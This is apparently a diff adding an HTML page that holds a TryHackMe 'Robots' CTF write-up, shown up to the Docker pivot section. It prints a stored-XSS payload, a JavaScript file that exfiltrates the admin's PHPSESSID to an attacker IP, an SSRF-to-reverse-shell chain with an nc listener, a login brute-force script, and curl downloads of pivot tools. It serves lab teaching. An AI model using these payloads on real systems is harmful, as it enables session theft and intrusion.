@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Robots — TryHackMe Writeup — Maks Huseynli</title>
+  <meta name="description" content="Robots TryHackMe writeup — robots.txt leaks a hidden path, a registration form advertises its own password scheme, stored XSS in the username field steals the admin's HttpOnly session through a same-origin XHR, SSRF turns into a reverse shell, and a Docker-network pivot with chisel reaches the internal MariaDB. Sudo curl config-file abuse and a sudo apache2 module-load chain finish at root." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:         #0b0f14;
+      --bg-2:       #0f1419;
+      --bg-3:       #141b22;
+      --bg-code:    #0d1117;
+      --border:     #1e2730;
+      --border-2:   #253040;
+      --text:       #c8d0da;
+      --text-dim:   #6b7a8d;
+      --text-faint: #3a4552;
+      --accent:     #4d9de0;
+      --accent-dim: #2d6fa8;
+      --green:      #34c759;
+      --yellow:     #ff9f0a;
+      --red:        #ff453a;
+      --mono: 'DM Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.75; -webkit-font-smoothing: antialiased; }
+
+    nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; background: rgba(11,15,20,0.88); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
+    .nav-inner { max-width: 1100px; margin: 0 auto; padding: 0 28px; height: 56px; display: flex; align-items: center; justify-content: space-between; }
+    .nav-brand { font-family: var(--mono); font-size: 13px; color: var(--accent); text-decoration: none; letter-spacing: 0.02em; }
+    .nav-links { display: flex; list-style: none; }
+    .nav-links a { font-size: 13px; color: var(--text-dim); text-decoration: none; padding: 6px 16px; border-radius: 4px; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--text); }
+    .nav-links a.active { color: var(--accent); }
+
+    .hero { padding: 96px 28px 56px; max-width: 1100px; margin: 0 auto; border-bottom: 1px solid var(--border); }
+    .hero-meta { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; flex-wrap: wrap; }
+    .badge { font-family: var(--mono); font-size: 10px; padding: 3px 9px; border-radius: 3px; letter-spacing: 0.07em; text-transform: uppercase; }
+    .badge-p { background: rgba(52,199,89,0.08);  color: var(--green);  border: 1px solid rgba(52,199,89,0.2); }
+    .badge-c { background: rgba(77,157,224,0.08); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-d { background: rgba(255,159,10,0.08); color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .badge-h { background: rgba(255,69,58,0.08);  color: var(--red);    border: 1px solid rgba(255,69,58,0.2); }
+    .badge-e { background: rgba(52,199,89,0.08);  color: var(--green);  border: 1px solid rgba(52,199,89,0.2); }
+    .hero h1 { font-size: clamp(28px, 5vw, 52px); font-weight: 300; line-height: 1.1; letter-spacing: -0.025em; color: #dce5ef; margin-bottom: 18px; }
+    .hero h1 strong { font-weight: 600; color: #edf2f7; }
+    .hero-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; max-width: 640px; line-height: 1.75; margin-bottom: 36px; border-left: 1px solid var(--border-2); padding-left: 20px; }
+    .hero-info { display: flex; gap: 40px; flex-wrap: wrap; }
+    .info-item { display: flex; flex-direction: column; gap: 4px; }
+    .info-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; }
+    .info-value { font-family: var(--mono); font-size: 12px; color: var(--text-dim); }
+    .info-value a { color: var(--accent); text-decoration: none; }
+    .info-value a:hover { text-decoration: underline; }
+
+    .body-wrap { display: grid; grid-template-columns: 1fr 196px; gap: 64px; max-width: 1100px; margin: 0 auto; padding: 64px 28px 120px; align-items: start; }
+
+    .toc { position: sticky; top: 76px; }
+    .toc-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 14px; }
+    .toc ul { list-style: none; display: flex; flex-direction: column; gap: 1px; }
+    .toc ul a { display: block; font-size: 11px; color: var(--text-dim); text-decoration: none; padding: 5px 8px; border-radius: 3px; border-left: 1px solid transparent; transition: color 0.15s, border-color 0.15s; }
+    .toc ul a:hover { color: var(--accent); border-left-color: var(--accent-dim); }
+
+    .section { margin-bottom: 64px; }
+    .s-num { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 6px; }
+    .section h2 { font-size: 19px; font-weight: 600; color: #dce5ef; letter-spacing: -0.018em; margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+    .section h3 { font-size: 14px; font-weight: 500; color: #b0c0d0; letter-spacing: -0.01em; margin: 26px 0 10px; }
+    .section p { font-size: 14px; color: var(--text-dim); line-height: 1.8; margin-bottom: 12px; }
+    .section p strong { color: var(--text); font-weight: 500; }
+    .section code { font-family: var(--mono); font-size: 12px; color: #a8bccd; background: rgba(255,255,255,0.04); border: 1px solid var(--border); padding: 1px 5px; border-radius: 3px; }
+
+    pre { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .ph { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .pl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .pd { display: flex; gap: 5px; }
+    .pd span { width: 8px; height: 8px; border-radius: 50%; display: block; }
+    pre code { display: block; padding: 18px; font-family: var(--mono); font-size: 12px; line-height: 1.72; color: #a0b8cc; overflow-x: auto; white-space: pre; background: none; border: none; }
+    .ck { color: #4a5a6a; font-style: italic; }
+    .ca { color: var(--accent); }
+    .cg { color: var(--green); }
+    .cr { color: var(--red); }
+    .cs { color: #ce9178; }
+    .cy { color: var(--yellow); }
+    .cp { color: #c8a0e0; }
+
+    .callout { padding: 14px 18px; border-radius: 5px; margin: 18px 0; border-left: 2px solid; font-size: 13px; line-height: 1.7; }
+    .blue   { background: rgba(77,157,224,0.05);  border-color: var(--accent); color: #88aacc; }
+    .yellow { background: rgba(255,159,10,0.05);  border-color: var(--yellow); color: #aa8855; }
+    .red    { background: rgba(255,69,58,0.05);   border-color: var(--red);    color: #aa6666; }
+    .green  { background: rgba(52,199,89,0.05);   border-color: var(--green);  color: #66aa77; }
+    .callout strong { color: inherit; font-weight: 600; }
+    .callout code { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.06); padding: 1px 5px; border-radius: 3px; font-family: var(--mono); font-size: 11.5px; }
+
+    .ports { display: flex; gap: 1px; background: var(--border); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .port { flex: 1; background: var(--bg-2); padding: 18px 14px; text-align: center; }
+    .port-num { font-family: var(--mono); font-size: 17px; color: var(--accent); font-weight: 500; }
+    .port-svc { font-family: var(--mono); font-size: 11px; color: var(--text-dim); margin-top: 4px; }
+    .port-note { font-size: 10px; color: var(--text-faint); margin-top: 3px; }
+
+    .shot { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .sh { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .sl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .ss { font-family: var(--mono); font-size: 10px; color: var(--accent); }
+    .shot img { display: block; width: 100%; height: auto; background: var(--bg-3); }
+    .sc { padding: 9px 14px; font-size: 11px; color: var(--text-faint); font-style: italic; border-top: 1px solid var(--border); background: var(--bg-2); }
+
+    .steps { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .step { display: grid; grid-template-columns: 52px 1fr; border-bottom: 1px solid var(--border); }
+    .step:last-child { border-bottom: none; }
+    .sn { display: flex; align-items: center; justify-content: center; background: var(--bg-2); border-right: 1px solid var(--border); font-family: var(--mono); font-size: 10px; color: var(--text-faint); padding: 14px 0; }
+    .sb { padding: 14px 18px; font-size: 13px; color: var(--text-dim); background: var(--bg); line-height: 1.7; }
+    .sb strong { color: var(--text); font-weight: 500; }
+
+    .chain { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; padding: 24px 28px; margin: 18px 0; }
+    .chain-row { display: flex; align-items: flex-start; gap: 14px; margin-bottom: 10px; }
+    .chain-row:last-child { margin-bottom: 0; }
+    .chain-arrow { font-family: var(--mono); font-size: 11px; color: var(--text-faint); padding-top: 2px; flex-shrink: 0; }
+    .chain-bug { font-family: var(--mono); font-size: 12px; color: var(--accent); flex-shrink: 0; min-width: 220px; }
+    .chain-gives { font-size: 12px; color: var(--text-dim); }
+
+    .tbl { width: 100%; border-collapse: collapse; margin: 16px 0; border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+    .tbl thead tr { background: var(--bg-2); }
+    .tbl th { font-family: var(--mono); font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-faint); text-align: left; padding: 10px 16px; font-weight: 400; border-bottom: 1px solid var(--border); }
+    .tbl td { padding: 10px 16px; font-family: var(--mono); font-size: 12px; color: var(--text-dim); border-bottom: 1px solid var(--border); background: var(--bg); }
+    .tbl tbody tr:last-child td { border-bottom: none; }
+    .tbl td:first-child { color: var(--accent); }
+    .tbl td em { color: var(--text-faint); font-style: normal; font-family: var(--sans); font-size: 12px; }
+
+    .tbl-wrap { overflow-x: auto; }
+
+    footer { border-top: 1px solid var(--border); padding: 28px; }
+    .footer-inner { max-width: 1100px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+    .footer-copy { font-family: var(--mono); font-size: 11px; color: var(--text-faint); }
+    .footer-links { display: flex; gap: 24px; }
+    .footer-links a { font-family: var(--mono); font-size: 11px; color: var(--text-faint); text-decoration: none; transition: color 0.2s; }
+    .footer-links a:hover { color: var(--text-dim); }
+
+    @media (max-width: 860px) { .body-wrap { grid-template-columns: 1fr; } .toc { display: none; } }
+    @media (max-width: 580px) { .hero, .body-wrap { padding-left: 20px; padding-right: 20px; } .ports { flex-direction: column; } .footer-inner { flex-direction: column; gap: 12px; } }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="nav-brand" href="../index.html">CyberMaks</a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../methodology.html">Methodology</a></li>
+      <li><a href="../about.html">About</a></li>
+      <li><a href="../index.html#case-studies" class="active">Writeups</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="hero-meta">
+    <span class="badge badge-p">TryHackMe</span>
+    <span class="badge badge-c">Web</span>
+    <span class="badge badge-c">XSS</span>
+    <span class="badge badge-c">SSRF</span>
+    <span class="badge badge-c">Docker Pivot</span>
+    <span class="badge badge-d">Medium</span>
+  </div>
+  <h1><strong>Robots</strong></h1>
+  <p class="hero-desc">
+    A <code>robots.txt</code> that reads like a list of Asimov's laws points at a hidden directory, and a registration form there volunteers its own password scheme — <code>md5(username&nbsp;+&nbsp;ddmm)</code>. The obvious move is to brute-force the admin's birthday, and it's a dead end that costs an hour. The room's real hint is one sentence on the same page: <em>"an admin monitors new users."</em> That's a pointer to stored XSS against the reviewer's session, which turns into SSRF, a reverse shell, a Docker-network pivot to an internal database, and two crisp sudo misconfigurations to root.
+  </p>
+  <div class="hero-info">
+    <div class="info-item"><span class="info-label">Platform</span><span class="info-value">TryHackMe</span></div>
+    <div class="info-item"><span class="info-label">Difficulty</span><span class="info-value">Medium</span></div>
+    <div class="info-item"><span class="info-label">Category</span><span class="info-value">Web / XSS / SSRF / Pivot</span></div>
+    <div class="info-item"><span class="info-label">Room</span><span class="info-value"><a href="https://tryhackme.com/room/robots" target="_blank" rel="noopener">tryhackme.com/room/robots</a></span></div>
+  </div>
+</header>
+
+<div class="body-wrap">
+<main>
+
+  <!-- ── 01 RECON ── -->
+  <section class="section" id="recon">
+    <div class="s-num">01</div>
+    <h2>Reconnaissance</h2>
+    <p>Full TCP sweep with service and script scanning. <code>-Pn</code> because the box doesn't answer ping, and the target is pinned to <code>robots.thm</code> in <code>/etc/hosts</code> first so name-based virtual hosting resolves.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+echo <span class="cs">"10.10.78.224  robots.thm"</span> | sudo tee -a /etc/hosts
+sudo nmap -T4 -n -sC -sV -Pn -p- robots.thm</code></pre>
+    <div class="ports">
+      <div class="port"><div class="port-num">22</div><div class="port-svc">SSH</div><div class="port-note">OpenSSH 8.9p1</div></div>
+      <div class="port"><div class="port-num">80</div><div class="port-svc">Apache 2.4.61</div><div class="port-note">403 + robots.txt</div></div>
+      <div class="port"><div class="port-num">9000</div><div class="port-svc">Apache 2.4.52</div><div class="port-note">Ubuntu default page</div></div>
+    </div>
+    <p>Port 80's root returns <strong>403 Forbidden</strong>, 9000 is a stock "It works" default page, and nmap's <code>http-robots.txt</code> script has already done the interesting part: three disallowed entries, all phrased as Asimov's Three Laws of Robotics.</p>
+    <pre><code><div class="ph"><span class="pl">nmap — http-robots.txt</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">| http-robots.txt: 3 disallowed entries
+|_/harming/humans /ignoring/human/orders /harm/to/self</span></code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">robots.thm/robots.txt</span><span class="ss">200 OK</span></div>
+      <img src="robots1.png" alt="Contents of http://robots.thm/robots.txt showing three Disallow entries: /harming/humans, /ignoring/human/orders, and /harm/to/self" loading="lazy" />
+      <div class="sc">The disallow list reads like the Three Laws — a nice touch, and a directory listing all at once.</div>
+    </div>
+    <p>A <code>robots.txt</code> exists to keep crawlers <em>out</em> of paths, which is precisely why it's the first place to look manually — it's a hand-written index of what the owner considered worth hiding. Two of the three dead-end at 403.</p>
+    <div class="shot">
+      <div class="sh"><span class="sl">robots.thm/ignoring/human/orders/</span><span class="ss">403 Forbidden</span></div>
+      <img src="robots2.png" alt="403 Forbidden page for http://robots.thm/ignoring/human/orders/, Apache 2.4.61 Debian server at robots.thm port 80" loading="lazy" />
+      <div class="sc">Two of the three disclosed paths return 403. Only <code>/harm/to/self/</code> is reachable.</div>
+    </div>
+  </section>
+
+  <!-- ── 02 ENUM ── -->
+  <section class="section" id="enum">
+    <div class="s-num">02</div>
+    <h2>Enumerating <code>/harm/to/self/</code></h2>
+    <p>The one reachable path is where the application actually lives. Two files matter immediately.</p>
+
+    <h3>server_info.php — a full phpinfo() leak</h3>
+    <p><code>/harm/to/self/server_info.php</code> renders a complete <code>phpinfo()</code> page. No credentials, but excellent fingerprinting: <strong>PHP 8.3.10, Apache 2.0 Handler, build system "Linux — Docker"</strong>, and the loaded extension list includes <code>pdo_mysql</code> and <code>sodium</code>. A PHP + MySQL backend running inside a container — remember the "Docker" line; it explains a lot later.</p>
+    <div class="shot">
+      <div class="sh"><span class="sl">server_info.php</span><span class="ss">phpinfo()</span></div>
+      <img src="robots3.png" alt="phpinfo output for PHP Version 8.3.10 showing System Linux robots.thm, Build System Linux - Docker, Server API Apache 2.0 Handler, and additional .ini files for pdo_mysql and sodium extensions" loading="lazy" />
+      <div class="sc">"Build System: Linux — Docker" and the <code>pdo_mysql</code> ini file — the stack is already described for us.</div>
+    </div>
+
+    <h3>register.php — the room hands you the password scheme</h3>
+    <p>The registration page states its own rules: <em>"An admin monitors new users. Your initial password will be <code>md5(username + ddmm)</code>"</em>, with a username field and a date-of-birth field.</p>
+    <div class="shot">
+      <div class="sh"><span class="sl">register.php</span><span class="ss">register form</span></div>
+      <img src="robots4.png" alt="Register here page stating An admin monitors new users, your initial password will be md5(username+ddmm), with username and date of birth input fields and a Submit Query button" loading="lazy" />
+      <div class="sc">Two facts on one page: the password is derivable, and an admin reviews every new account.</div>
+    </div>
+    <div class="callout blue"><strong>Two hints are competing for attention here.</strong> The loud one — "passwords are <code>md5(username+ddmm)</code>" — invites a brute-force. The quiet one — "an admin monitors new users" — describes a human who will <em>view</em> attacker-controlled data. The quiet hint is the real vector. I chased the loud one first anyway.</div>
+  </section>
+
+  <!-- ── 03 RABBIT HOLE ── -->
+  <section class="section" id="rabbithole">
+    <div class="s-num">03</div>
+    <h2>Rabbit Hole — Brute-Forcing admin's Password</h2>
+    <p>The reasoning felt airtight: if every password is <code>md5(username + ddmm)</code>, then <code>admin</code>'s password is <code>md5("admin" + birthday)</code>, and a birthday is only ever one of 366 <code>ddmm</code> values (I generated both <code>ddmm</code> and <code>mmdd</code> orderings, ~600 candidates). Register a known account first to learn what a successful login looks like — a 302 to <code>index.php</code> — then fire every candidate at <code>login.php</code> and compare.</p>
+    <pre><code><div class="ph"><span class="pl">exploit.py — admin brute-force (dead end)</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cp">import</span> hashlib, requests
+
+URL    = <span class="cs">"http://robots.thm/harm/to/self/login.php"</span>
+TARGET = <span class="cs">"admin"</span>
+
+<span class="cp">def</span> <span class="cy">md5</span>(t): <span class="cp">return</span> hashlib.md5(t.encode()).hexdigest()
+
+<span class="cp">def</span> <span class="cy">dates</span>():
+    out = <span class="cp">set</span>()
+    <span class="cp">for</span> m <span class="cp">in</span> <span class="cp">range</span>(1, 13):
+        <span class="cp">for</span> d <span class="cp">in</span> <span class="cp">range</span>(1, 32):
+            out.add(<span class="cs">f"{d:02d}{m:02d}"</span>); out.add(<span class="cs">f"{m:02d}{d:02d}"</span>)
+    <span class="cp">return</span> <span class="cp">sorted</span>(out)
+
+<span class="cp">def</span> <span class="cy">login</span>(u, p):
+    r = requests.post(URL, data={<span class="cs">"username"</span>: u, <span class="cs">"password"</span>: p, <span class="cs">"login"</span>: <span class="cs">"Submit Query"</span>},
+                      allow_redirects=<span class="cp">False</span>, timeout=10)
+    <span class="cp">return</span> (r.status_code, r.headers.get(<span class="cs">"Location"</span>, <span class="cs">""</span>))
+
+<span class="ck"># success == (302, 'index.php'), failure == (200, '')</span>
+<span class="cp">for</span> date <span class="cp">in</span> dates():
+    <span class="cp">if</span> login(TARGET, md5(TARGET + date)) == (<span class="cg">302</span>, <span class="cs">"index.php"</span>):
+        <span class="cp">print</span>(<span class="cs">f"[+] FOUND {date}"</span>); <span class="cp">break</span></code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">exploit.py — running</span><span class="ss">no match</span></div>
+      <img src="robots.rabbithole.png" alt="Terminal running python3 exploit.py, printing success looks like (302, index.php), failure looks like (200, ), then progress 50/600, 100/600, 150/600 with no match found" loading="lazy" />
+      <div class="sc">The oracle works perfectly (302 vs 200) — there's just nothing to find. admin's date isn't guessable this way.</div>
+    </div>
+    <div class="callout yellow"><strong>Dead end — roughly an hour lost.</strong> The script is correct; the premise is wrong. "An admin monitors new users" isn't flavour text, it's the exploit brief: the admin is a browser that will render whatever a new registration puts on screen. That's a <strong>stored XSS</strong> target, not a login to brute-force. Worth keeping the failed attempt in the writeup — recognising <em>which</em> hint the room is actually giving is the skill being tested.</div>
+  </section>
+
+  <!-- ── 04 XSS ── -->
+  <section class="section" id="xss">
+    <div class="s-num">04</div>
+    <h2>Stored XSS → Admin Session Theft</h2>
+    <p>The username I register is displayed back inside the admin's review panel. If it's rendered without encoding, the username field is a stored-XSS sink. So register an account whose <em>username</em> is a script tag pulling in external JS from my box:</p>
+    <pre><code><div class="ph"><span class="pl">username field — XSS payload</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+&lt;script src=<span class="cs">"http://192.168.146.233:8002/legit_user.js"</span>&gt;&lt;/script&gt;</code></pre>
+    <p>The catch: <code>config.php</code> sets <code>session.cookie_httponly = 1</code>, so <code>document.cookie</code> is off the table — the session cookie is invisible to JavaScript. But HttpOnly only stops JS from <em>reading the cookie object</em>; it does nothing to stop the browser from <em>sending</em> the cookie on a same-origin request. So instead of stealing the cookie, I make the admin's own browser fetch a page that echoes the session id back in its body, and exfiltrate that. <code>server_info.php</code> (phpinfo) dumps every cookie into the page, including <code>PHPSESSID</code>. <span class="ck">(technique via HackTricks — "steal page content")</span></p>
+    <pre><code><div class="ph"><span class="pl">legit_user.js</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cp">var</span> url      = <span class="cs">"http://robots.thm/harm/to/self/server_info.php"</span>;
+<span class="cp">var</span> attacker = <span class="cs">"http://192.168.146.233:8002/exfil"</span>;
+<span class="cp">var</span> xhr = <span class="cp">new</span> XMLHttpRequest();
+xhr.onreadystatechange = <span class="cp">function</span>() {
+  <span class="cp">if</span> (xhr.readyState == XMLHttpRequest.DONE) {
+    <span class="cp">var</span> match = xhr.responseText.match(/PHPSESSID=([a-zA-Z0-9]+)/);
+    <span class="cp">if</span> (match) fetch(attacker + <span class="cs">"?cookie="</span> + match[<span class="cg">1</span>]);
+  }
+};
+xhr.open(<span class="cs">'GET'</span>, url, <span class="cp">true</span>);
+xhr.send(<span class="cp">null</span>);</code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">legit_user.js — same-origin XHR + exfil</span><span class="ss">source</span></div>
+      <img src="robots7.png" alt="Source of legit_user.js: XMLHttpRequest GET to server_info.php, regex match on PHPSESSID in the response text, then fetch to the attacker exfil endpoint with the cookie as a query parameter" loading="lazy" />
+      <div class="sc">The XHR runs in the admin's origin, so the HttpOnly cookie rides along automatically — the regex just plucks it back out of the phpinfo body.</div>
+    </div>
+    <p>Host the payload and catch the callback with a single static server:</p>
+    <pre><code><div class="ph"><span class="pl">attack box</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+python3 -m http.server 8002</code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">http.server 8002 — access log</span><span class="ss">callback</span></div>
+      <img src="robots6.png" alt="Python http.server on port 8002 logging a 200 for GET /legit_user.js followed by a GET /exfil?cookie=thd0eosgh78pbt4ujuu49fqu4m returning 404, from the admin's browser IP" loading="lazy" />
+      <div class="sc">First the admin's browser pulls <code>legit_user.js</code>, then it calls back with the stolen <code>PHPSESSID</code> in the query string.</div>
+    </div>
+    <div class="callout blue"><strong>The 404 on <code>/exfil</code> is expected and harmless.</strong> <code>http.server</code> has no such route, but it logs the full request line before answering — the cookie in the query string is already captured. No need for a real endpoint.</div>
+    <p>Drop the stolen <code>PHPSESSID</code> into the browser (dev tools → Storage → Cookies) and reload <code>index.php</code>. Now authenticated as admin, with a "Last logins" panel — and every injected username plainly visible in the list, confirming the stored-XSS sink.</p>
+    <div class="shot">
+      <div class="sh"><span class="sl">index.php — admin panel via stolen session</span><span class="ss">authenticated</span></div>
+      <img src="robots8.png" alt="Last logins admin panel accessible with the stolen session, listing User 1 admin, User 3 maks, User 4 maks&gt;, and users whose names render as broken script-tag images, confirming stored XSS" loading="lazy" />
+      <div class="sc">Users 5–7 render as broken images — those are the <code>&lt;script src&gt;</code> usernames the panel tried to display. The sink is confirmed.</div>
+    </div>
+    <div class="callout green"><strong>The general rule:</strong> if input you control is <em>stored</em> and later <em>displayed</em> to another user without output encoding, that's stored XSS — regardless of HttpOnly. When cookies are locked away, pivot to a same-origin authenticated request against any page that reflects the session (or any admin-only action) and exfiltrate <em>that</em>.</div>
+  </section>
+
+  <!-- ── 05 SSRF → RCE ── -->
+  <section class="section" id="ssrf">
+    <div class="s-num">05</div>
+    <h2>SSRF → Reverse Shell as www-data</h2>
+    <p>The admin panel exposes a <strong>"Test url"</strong> utility (<code>admin.php</code>) that fetches an arbitrary URL server-side and prints the response. That's textbook SSRF — and because the fetch originates from the server, first confirm it by pointing it at a local file via the <code>file://</code> handler:</p>
+    <div class="shot">
+      <div class="sh"><span class="sl">admin.php — SSRF reads /etc/passwd</span><span class="ss">file://</span></div>
+      <img src="robots9.png" alt="admin.php Test url output showing the full contents of /etc/passwd fetched server-side, listing root, daemon, www-data and other accounts" loading="lazy" />
+      <div class="sc">Feeding <code>file:///etc/passwd</code> to the "Test url" field proves the fetch runs on the server, not the client.</div>
+    </div>
+    <p>An SSRF that fetches arbitrary URLs is one short step from RCE: point it at a PHP reverse-shell hosted on my box. The server retrieves it over HTTP and — because the fetch is server-side and PHP is the runtime — executes it.</p>
+    <pre><code><div class="ph"><span class="pl">attack box — host payload + listener</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># serve a standard php-reverse-shell (set $ip/$port inside it)</span>
+python3 -m http.server 8004
+<span class="ck"># catch the callback</span>
+nc -lvnp 7777</code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">admin.php — Test url</span><span class="ss">SSRF → shell.php</span></div>
+      <img src="robots10.png" alt="admin.php Test url form with the value http://192.168.146.233:8004/shell.php entered, ready to submit" loading="lazy" />
+      <div class="sc">The SSRF field pointed at the reverse-shell payload on the attack box.</div>
+    </div>
+    <p>Submitting the request lands a shell:</p>
+    <pre><code><div class="ph"><span class="pl">nc — listener</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+Connection received on 10.112.165.14 46008
+<span class="cg">Linux robots.thm 5.15.0-118-generic #128-Ubuntu ... x86_64 GNU/Linux
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">www-data — foothold</span><span class="ss">id / passwd / uname</span></div>
+      <img src="robots11.png" alt="www-data shell output: whoami returns www-data, cat /etc/passwd, uname -a shows Linux robots.thm 5.15.0-118-generic Ubuntu kernel, /etc/os-release shows Debian GNU/Linux 12 bookworm, id shows uid 33 www-data" loading="lazy" />
+      <div class="sc">Foothold as <code>www-data</code>. Note the mismatch — Ubuntu kernel, Debian 12 userland — the classic sign of a container on a different host OS.</div>
+    </div>
+    <div class="callout yellow"><strong>The environment is bare.</strong> No <code>wget</code>, no <code>nc</code>, no <code>ping</code>, no <code>ss</code>, no <code>ip</code>. It's a minimal PHP container, and the OS mismatch (Debian 12 userland on an Ubuntu kernel) confirms it. Escaping and pivoting from here will mean bringing my own tools.</div>
+  </section>
+
+  <!-- ── 06 LOOT ── -->
+  <section class="section" id="loot">
+    <div class="s-num">06</div>
+    <h2>Loot — config.php and a Hostname Named "db"</h2>
+    <pre><code><div class="ph"><span class="pl">container — www-data</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+cat config.php</code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">config.php</span><span class="ss">DB credentials</span></div>
+      <img src="robots12.png" alt="config.php contents: servername db, username robots, password q4qCz1OflKvKwK4S, dbname web, plus a hostname redirect to robots.thm and ini_set session.cookie_httponly 1" loading="lazy" />
+      <div class="sc">DB creds, the <code>httponly</code> setting that shaped the XSS, and one detail that changes everything: <code>$servername = "db"</code>.</div>
+    </div>
+    <p>Credentials in hand: <code>robots</code> / <code>q4qCz1OflKvKwK4S</code>, database <code>web</code>. My first instinct was that <code>db</code> was just a local alias — but <code>$servername = "db"</code> in a config that phpinfo already told us was built under Docker is a strong tell. <code>db</code> is a <strong>Docker Compose service name</strong>, resolved by the internal Docker DNS to a <em>separate</em> container. Confirming with <code>/etc/hosts</code> shows this container is <code>172.18.0.3</code> — and <code>db</code> is somewhere else on that bridge network, unreachable from my attack box directly.</p>
+    <div class="callout blue"><strong><code>$servername = "db"</code> (or "mysql", "redis", "backend") in a leaked config is a fingerprint of Docker Compose.</strong> The database isn't on localhost — it's another container on a private bridge network. Expect to need a pivot rather than a direct connection.</div>
+  </section>
+
+  <!-- ── 07 PIVOT ── -->
+  <section class="section" id="pivot">
+    <div class="s-num">07</div>
+    <h2>Pivoting to the Internal MySQL Container</h2>
+    <p>To reach <code>db</code> I need two things the container doesn't have: a way to scan the internal subnet, and a tunnel back through the web container to my box. Both get uploaded over the attack box's own HTTP server with the one download tool that <em>is</em> present — <code>curl</code>.</p>
+    <pre><code><div class="ph"><span class="pl">attack box — serve tooling</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># static busybox for a working nc, and the chisel client binary</span>
+wget https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox -O busybox
+python3 -m http.server 8001</code></pre>
+    <pre><code><div class="ph"><span class="pl">container — pull tooling via curl</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -o /tmp/chisel  http://192.168.128.12:8001/chisel  && chmod +x /tmp/chisel
+curl -o /tmp/busybox http://192.168.128.12:8001/busybox && chmod +x /tmp/busybox</code></pre>
+    <div class="callout yellow"><strong>Verify what you downloaded.</strong> The first <code>curl</code> of a bare filename that didn't exist on the server saved the 404 HTML page as <code>/tmp/nc</code> — <code>file /tmp/nc</code> reported "HTML document, ASCII text". A downloaded "binary" that won't run is often just a saved error page. Serve the right file and re-check.</div>
